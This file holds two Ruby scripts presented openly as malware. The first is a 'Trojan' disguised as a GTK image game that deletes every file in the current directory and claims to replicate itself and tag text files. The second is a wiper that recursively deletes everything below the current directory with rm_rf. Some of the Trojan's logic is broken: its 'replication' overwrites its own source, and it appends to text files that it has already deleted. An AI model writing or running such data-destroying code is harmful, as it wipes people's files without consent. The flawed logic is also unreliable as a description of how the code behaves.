# This is a simple Trojan program disguised as a GUI game that performs the following actions when run:
# - Replicates itself
# - Deletes all the files in the current directory
# - Displays a random image from a list of images
# - Appends a message to all text files in the current directory

# Require the 'gtk3' and 'fileutils' libraries to access GUI and file manipulation functions
require 'gtk3'
require 'fileutils'

# Set up the GUI
window = Gtk::Window.new
window.set_title("GUI Game")
window.set_default_size(400, 300)
window.signal_connect("destroy") { Gtk.main_quit }

# Set up the image widget and add it to the window
image = Gtk::Image.new
window.add(image)

# Set up the list of images
images = ["image1.png", "image2.png", "image3.png"]

# Display a random image from the list
image.set_from_file(images.sample)

# Replicate the program
File.open(__FILE__, "w") do |f|
  f.puts self.to_s
end

# Delete all the files in the current directory
files = Dir.entries(".")
files.delete(".")
files.delete("..")
files.each do |file|
  FileUtils.rm(file)
end

# Append a message to all text files in the current directory
message = "This file has been modified by the Trojan program"
Dir.glob("*.txt") do |file|
  File.open(file, "a") do |f|
    f.puts message
  end
end

# Show the window and start the GUI loop
window.show_all
Gtk.main


# This is a simple wiper malware program that will delete all the files in the current directory and all its subdirectories when run.

# Require the 'fileutils' library to access file manipulation functions
require 'fileutils'

# Set up the list of files and directories to delete
files_and_dirs = Dir.glob("**/*")

# Delete all the files and directories in the list
files_and_dirs.each do |file_or_dir|
  FileUtils.rm_rf(file_or_dir)
end
